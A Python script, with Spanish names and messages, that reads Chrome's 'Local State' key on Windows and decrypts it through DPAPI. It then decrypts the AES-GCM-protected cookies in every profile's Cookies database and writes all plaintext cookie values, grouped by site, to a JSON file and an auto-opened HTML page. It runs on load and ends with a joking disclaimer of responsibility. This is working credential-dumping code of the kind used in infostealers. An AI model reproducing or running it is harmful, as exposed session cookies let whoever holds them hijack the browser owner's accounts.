import os
import json
import sqlite3
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64
import win32crypt
from bs4 import BeautifulSoup
from datetime import datetime
import webbrowser
import os
from collections import defaultdict

user = os.environ['USERNAME']

local_state_path = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

def desencriptar(encriptados):
    try:
        return win32crypt.CryptUnprotectData(encriptados, None, None, None, 0)[1].decode()
    except:
        pass

    if encriptados[:3] == b'v10':
        encriptados = encriptados[3:]
        key = obtener_key()
        if key is None:
            print("Error: No se pudo obtener la clave de encriptación.")
            return ""
        iv = encriptados[:12]
        tag = encriptados[-16:]
        encriptados = encriptados[12:-16]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        try:
            desencriptados = decryptor.update(encriptados) + decryptor.finalize()
            return desencriptados.decode()
        except Exception as e:
            print(f"Error al desencriptar: {e}")
            return ""


def agrupar_cookies_por_host(cursor):
    cookies_agrupadas = defaultdict(list)
    
    for host_key, name, path, encriptados in cursor.fetchall():
        desencriptados = desencriptar(encriptados)
        cookie = {
            "nombre": name,
            "ubi": path,
            "valor": desencriptados
        }
        cookies_agrupadas[host_key].append(cookie)
    
    return cookies_agrupadas

def get_chrome_cookies():
    if not os.path.exists(local_state_path):
        print("Error: No se encontró el archivo 'Local State'.")
        return
    
    path_base = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"

    user_data_carpetas = [folder for folder in os.listdir(path_base) if os.path.isdir(os.path.join(path_base, folder))]

    all_cookies = []

    for folder in user_data_carpetas:
        path_to_cookies = os.path.join(path_base, folder, "Network\\Cookies")

        if not os.path.exists(path_to_cookies):
            print("No se encontró el archivo de cookies en la ruta especificada:", path_to_cookies)
            continue

        try:
            conn = sqlite3.connect(path_to_cookies)
        except sqlite3.OperationalError as e:
            print(f"Error al abrir la base de datos de cookies en la carpeta {folder}: {e}")
            continue

        cursor = conn.cursor()

        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tablas = cursor.fetchall()
        print(f"Tablas en la base de datos de la carpeta {folder}:", tablas)

        if ('cookies',) not in tablas:
            print(f"No se encontró la tabla 'cookies' en la base de datos de la carpeta {folder}.")
            conn.close()
            continue

        cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
        
        # Agrupamos las cookies por host_key
        cookies_agrupadas = agrupar_cookies_por_host(cursor)

        for host_key, cookies in cookies_agrupadas.items():
            all_cookies.append({
                "host_key": host_key,
                "cookies": cookies
            })

        conn.close()

    with open('./test.json', 'w') as json_file:
        json.dump(all_cookies, json_file)

    save_to_html()
    return all_cookies

def obtener_key():
    with open(local_state_path, 'r') as file:
        local_state = json.loads(file.read())
        if 'os_crypt' not in local_state:
            print("Error: No se encontró la clave de encriptación en 'Local State'.")
            return None
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:] 
        try:
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print(f"Error al desencriptar la clave: {e}")
            return None

def save_to_html():
    with open('./test.json', 'r') as json_file:
        datos = json.load(json_file)
    
    with open('./html/plantilla.html', 'r') as html_file:
        soup = BeautifulSoup(html_file, 'html.parser')

    output_div = soup.find('div', {'class': 'output'})

    cookies_agrupadas = defaultdict(list)
    for item in datos:
        host_key = item['host_key']
        cookies = item['cookies']
        cookies_agrupadas[host_key].extend(cookies)

    for host_key, cookies in cookies_agrupadas.items():
        container = soup.new_tag('div', **{'class': 'host-container'})

        h1 = soup.new_tag('h1', **{'class': 'valores', 'onclick': 'toggleVisibility(this)'})
        h1.string = f'{host_key}'
        container.append(h1)

        ul = soup.new_tag('ul', **{'class': 'cookie-list', 'style': 'display:none;'})
        for cookie in cookies:
            li = soup.new_tag('li')
            li.string = f"{cookie['nombre']} - {cookie['ubi']} - {cookie['valor']}"
            ul.append(li)
        
        container.append(ul)
        output_div.append(container)

    now = datetime.now()
    tiempo = now.strftime('%d-%m_%H-%M')

    outputname = f'output-{tiempo}.html'
    outputpath = f'./html/{outputname}'

    script_tag = soup.new_tag('script')
    script_tag.string = """
    function toggleVisibility(element) {
        var ul = element.nextElementSibling;
        if (ul.style.display === "none") {
            ul.style.display = "block";
        } else {
            ul.style.display = "none";
        }
    }
    """
    soup.body.append(script_tag)
    
    with open(outputpath, 'w') as output_file:
        output_file.write(str(soup))
    
    webbrowser.open('file://' + os.path.realpath(outputpath))

get_chrome_cookies() # NO me hago responsable de lo que suceda luego de ejecutar esta funcion jiji:)